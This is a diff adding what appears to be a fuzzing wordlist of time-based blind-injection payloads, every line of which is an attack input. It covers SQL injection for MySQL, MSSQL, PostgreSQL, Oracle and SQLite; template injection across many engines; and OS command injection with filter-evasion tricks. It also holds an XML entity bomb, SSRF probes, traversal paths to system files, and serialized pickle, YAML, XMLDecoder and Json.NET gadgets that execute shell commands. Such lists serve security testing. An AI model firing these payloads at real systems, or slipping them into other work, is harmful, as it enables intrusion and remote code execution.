@@ -1,0 +1,213 @@
+SLEEP(5)/*'XOR(IF(1=1,SLEEP(5),0))OR'"XOR(IF(1=1,SLEEP(5),0))OR"*/
+1;WAITFOR DELAY '0:0:5'--/*'OR SLEEP(5) OR'1'='1*/"OR pg_sleep(5)--
+1)OR(SLEEP(5))OR('/**/')OR(BENCHMARK(5000000,SHA1('a')))OR("/**/")OR(pg_sleep(5))--
+'AND LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))OR'1'='1/*"AND LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))--*/
+'))OR SLEEP(5) OR(('/*'))OR pg_sleep(5)--*/')OR LIKE('A',UPPER(HEX(RANDOMBLOB(500000000/2))))--
+{{__import__('time').sleep(5)}}${T(java.lang.Thread).sleep(5000)}<%= sleep(5) %>${{T(java.lang.Thread).sleep(5000)}}#{sleep(5)}
+{% set x=__import__('time').sleep(5) %}#{sleep(5)}${{T(java.lang.Thread).sleep(5000)}}[[${T(java.lang.Thread).sleep(5000)}]]
+;sleep 5 #'|sleep 5|"$(sleep 5)`sleep 5`
+&timeout /T 5&;sleep 5;'|sleep 5 #"|timeout 5|`sleep 5`
+||sleep 5&&sleep 5;sleep 5|sleep 5\n$(sleep 5)\n`sleep 5`
+__import__('time').sleep(5)
+sleep(5)
+require('child_process').execSync('sleep 5')
+java.lang.Thread.sleep(5000)
+select(undef,undef,undef,5)
+'OR SLEEP(5)#
+"OR SLEEP(5)#
+')OR SLEEP(5)#
+'))OR SLEEP(5)#
+*/OR SLEEP(5)#
+1 OR SLEEP(5)#
+'AND SLEEP(5)#
+"AND SLEEP(5)#
+'AND SLEEP(5) AND '1'='1
+"AND SLEEP(5) AND "1"="1
+'OR BENCHMARK(5000000,SHA1('a'))#
+"OR BENCHMARK(5000000,SHA1('a'))#
+')OR BENCHMARK(5000000,SHA1('a'))#
+1 OR BENCHMARK(5000000,SHA1('a'))#
+'AND IF(1=1,SLEEP(5),0)#
+"AND IF(1=1,SLEEP(5),0)#
+')AND IF(1=1,SLEEP(5),0)#
+1 AND IF(1=1,SLEEP(5),0)#
+'XOR(IF(1=1,SLEEP(5),0))XOR'Z
+"XOR(IF(1=1,SLEEP(5),0))XOR"Z
+0'XOR(IF(1=1,SLEEP(5),0))XOR'Z
+(SELECT(0)FROM(SELECT(SLEEP(5)))v)/*'+(SELECT(0)FROM(SELECT(SLEEP(5)))v)+'"+(SELECT(0)FROM(SELECT(SLEEP(5)))v)+"*/
+';WAITFOR DELAY '0:0:5'--
+";WAITFOR DELAY '0:0:5'--
+');WAITFOR DELAY '0:0:5'--
+'));WAITFOR DELAY '0:0:5'--
+*/;WAITFOR DELAY '0:0:5'--
+1;WAITFOR DELAY '0:0:5'--
+1);WAITFOR DELAY '0:0:5'--
+'AND 1=(SELECT 1 FROM(SELECT WAITFOR DELAY '0:0:5')a)--
+"AND 1=(SELECT 1 FROM(SELECT WAITFOR DELAY '0:0:5')a)--
+')AND 1=(SELECT 1 FROM(SELECT WAITFOR DELAY '0:0:5')a)--
+'OR 1=(SELECT 1 WHERE 1=1 WAITFOR DELAY '0:0:5')--
+"OR 1=(SELECT 1 WHERE 1=1 WAITFOR DELAY '0:0:5')--
+';IF(1=1) WAITFOR DELAY '0:0:5'--
+";IF(1=1) WAITFOR DELAY '0:0:5'--
+');IF(1=1) WAITFOR DELAY '0:0:5'--
+1;IF(1=1) WAITFOR DELAY '0:0:5'--
+'OR(SELECT pg_sleep(5))::text='1
+"OR(SELECT pg_sleep(5))::text="1
+')OR(SELECT pg_sleep(5))IS NOT NULL--
+'))OR(SELECT pg_sleep(5))IS NOT NULL--
+*/OR(SELECT pg_sleep(5))IS NOT NULL--
+1 OR(SELECT pg_sleep(5))IS NOT NULL--
+'AND(SELECT pg_sleep(5))IS NOT NULL--
+"AND(SELECT pg_sleep(5))IS NOT NULL--
+'AND(SELECT pg_sleep(5))IS NOT NULL AND '1'='1
+';SELECT pg_sleep(5)--
+";SELECT pg_sleep(5)--
+');SELECT pg_sleep(5)--
+1;SELECT pg_sleep(5)--
+'||(SELECT pg_sleep(5))||'
+'AND 1=(SELECT CASE WHEN 1=1 THEN(SELECT pg_sleep(5)) ELSE 1 END)--
+"AND 1=(SELECT CASE WHEN 1=1 THEN(SELECT pg_sleep(5)) ELSE 1 END)--
+'AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--
+"AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--
+')AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--
+1 AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--
+'OR 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--
+"OR 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--
+'AND 1=DBMS_LOCK.SLEEP(5)--
+"AND 1=DBMS_LOCK.SLEEP(5)--
+')AND 1=DBMS_LOCK.SLEEP(5)--
+1 AND 1=DBMS_LOCK.SLEEP(5)--
+'||DBMS_PIPE.RECEIVE_MESSAGE('a',5)||'
+'AND 1=(SELECT CASE WHEN 1=1 THEN DBMS_PIPE.RECEIVE_MESSAGE('a',5) ELSE 1 END FROM dual)--
+'AND LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))--
+"AND LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))--
+')AND LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))--
+1 AND LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))--
+'OR RANDOMBLOB(500000000/2)--
+"OR RANDOMBLOB(500000000/2)--
+IF(1=1,SLEEP(5),0)/*'XOR(IF(1=1,SLEEP(5),0))OR'"XOR(IF(1=1,SLEEP(5),0))OR"*/
+(SELECT(0)FROM(SELECT(SLEEP(5)))v)/*'XOR(IF(1=1,SLEEP(5),0))OR'"XOR(IF(1=1,SLEEP(5),0))OR"*/
+SLEEP(5)/*'OR SLEEP(5) OR'"OR SLEEP(5) OR"*/
+1 AND(SELECT 1 FROM(SELECT SLEEP(5))a)/*'AND(SELECT 1 FROM(SELECT SLEEP(5))a) AND'1'='1"AND(SELECT 1 FROM(SELECT SLEEP(5))a) AND"1"="1*/
+'AND(SELECT CASE WHEN(1=1)THEN SLEEP(5) ELSE 1 END)/*"AND(SELECT CASE WHEN(1=1)THEN SLEEP(5) ELSE 1 END)*/--
+0'XOR(if(now()=sysdate(),SLEEP(5),0))XOR'Z/*"XOR(if(now()=sysdate(),SLEEP(5),0))XOR"Z*/
+' AND pg_sleep(5) IS NOT NULL--
+{{config.__class__.__init__.__globals__['__builtins__']['__import__']('time').sleep(5)}}
+{{lipsum.__globals__['__builtins__']['__import__']('time').sleep(5)}}
+{{cycler.__init__.__globals__['__builtins__']['__import__']('time').sleep(5)}}
+{{joiner.__init__.__globals__['__builtins__']['__import__']('time').sleep(5)}}
+{{''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['__import__']('time').sleep(5)}}
+{{request.application.__globals__.__builtins__.__import__('time').sleep(5)}}
+{{self._TemplateReference__context.cycler.__init__.__globals__['__builtins__']['__import__']('time').sleep(5)}}
+${__import__("time").sleep(5)}
+<%import time;time.sleep(5)%>
+<%= sleep(5) %>
+<%= Kernel.sleep(5) %>
+{{['5']|filter('sleep')}}
+{{['5']|map('sleep')}}
+${T(java.lang.Thread).sleep(5000)}
+${"freemarker.template.utility.Execute"?new()("sleep 5")}
+<#assign ex="freemarker.template.utility.Execute"?new()>${ex("sleep 5")}
+<% var t=Date.now();while(Date.now()-t<5000){} %>
+{{#with "s" as |string|}}{{#with "e"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub "constructor")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push "return require('child_process').execSync('sleep 5');"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}
+{%import time%}{{time.sleep(5)}}
+{{range(99999999)|join}}
+{php}sleep(5);{/php}
+@php sleep(5); @endphp
+<%=sleep(5)%>
+<%=sleep 5%>
+=sleep(5)
+[[${T(java.lang.Thread).sleep(5000)}]]
+{{"".getClass().forName("java.lang.Thread").getMethod("sleep",long.class).invoke(null,5000)}}
+@{System.Threading.Thread.Sleep(5000);}
+;sleep 5
+|sleep 5
+||sleep 5
+&&sleep 5
+$(sleep 5)
+`sleep 5`
+;sleep 5 #
+|sleep 5 #
+;sleep${IFS}5
+${IFS}sleep${IFS}5
+;sleep 5;
+|sleep 5|
+||sleep 5||
+&&sleep 5&&
+;sleep 5#'|sleep 5|"`sleep 5`
+;/bin/sleep 5
+;/usr/bin/sleep 5
+;$(sleep 5)
+;`sleep 5`
+& timeout 5
+| timeout 5
+|| timeout 5
+&& timeout 5
+& timeout /t 5 /nobreak
+| timeout /t 5 /nobreak
+& ping -n 6 127.0.0.1
+| ping -n 6 127.0.0.1
+& ping -n 6 127.0.0.1 >nul
+& powershell Start-Sleep -s 5
+| powershell Start-Sleep -s 5
+& powershell -c "Start-Sleep 5"
+;sleep 5 #'& timeout 5 &"`sleep 5`
+;python3 -c "__import__('time').sleep(5)"
+;python -c "import time;time.sleep(5)"
+;perl -e "sleep(5)"
+;ruby -e "sleep(5)"
+;node -e "require('child_process').execSync('sleep 5')"
+;sleep$IFS'5'
+;sl\eep 5
+;s'l'e'e'p 5
+;s"l"e"e"p 5
+;$'\x73\x6c\x65\x65\x70' 5
+;/???/s?e?p 5
+__import__("time").sleep(5)
+exec("import time;time.sleep(5)")
+sum(range(500000000))
+(function(){var t=Date.now();while(Date.now()-t<5000){}}())
+for(var i=0;i<5e9;i++){}
+Atomics.wait(new Int32Array(new SharedArrayBuffer(4)),0,0,5000)
+usleep(5000000)
+time_nanosleep(5,0)
+array_map(function($x){return $x*$x;},range(1,99999999))
+sleep(5);
+sleep 5
+Kernel.sleep(5)
+99999999.times{1+1}
+Start-Sleep -Seconds 5
+[System.Threading.Thread]::Sleep(5000)
+<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "1337"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"><!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">]><root>&lol3;</root>
+http://10.255.255.1/
+http://192.0.2.1/
+http://198.51.100.1/
+http://203.0.113.1/
+https://10.255.255.1/
+http://10.255.255.1:8080/
+http://10.255.255.1:443/
+http://192.0.2.1:8443/
+http://[fd00::1]/
+http://192.168.255.255/
+http://172.31.255.255/
+ftp://10.255.255.1/
+gopher://192.0.2.1:70/
+http://10.255.255.1:9999/timeout
+/dev/urandom
+/proc/self/fd/0
+../../../../../../../dev/random
+/proc/self/exe
+../../../../../../../proc/kmsg
+/dev/stdin
+../../../../../../../proc/self/mem
+[$where]=sleep(5000)
+#{T(java.lang.Thread).sleep(5000)}
+%{@java.lang.Thread@sleep(5000)}
+Y29zCnN5c3RlbQooUydzbGVlcCA1Jwp0Ui4=
+gAJjcG9zaXgKc3lzdGVtCnEAWAcAAABzbGVlcCA1cQGFcQJScQMu
+gASVIgAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAdzbGVlcCA1lIWUUpQu
+!!python/object/apply:os.system ["sleep 5"]
+{"py/reduce":[{"py/function":"time.sleep"},{"py/tuple":[5]}]}
+{"rce":"_$$ND_FUNC$$_function(){require('child_process').execSync('sleep 5')}()"}
+<java version="1.8.0" class="java.beans.XMLDecoder"><object class="java.lang.Thread" method="sleep"><long>5000</long></object></java>
+{"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework","MethodName":"Start","ObjectInstance":{"$type":"System.Diagnostics.Process, System","StartInfo":{"$type":"System.Diagnostics.ProcessStartInfo, System","FileName":"cmd","Arguments":"/c timeout 5"}}}
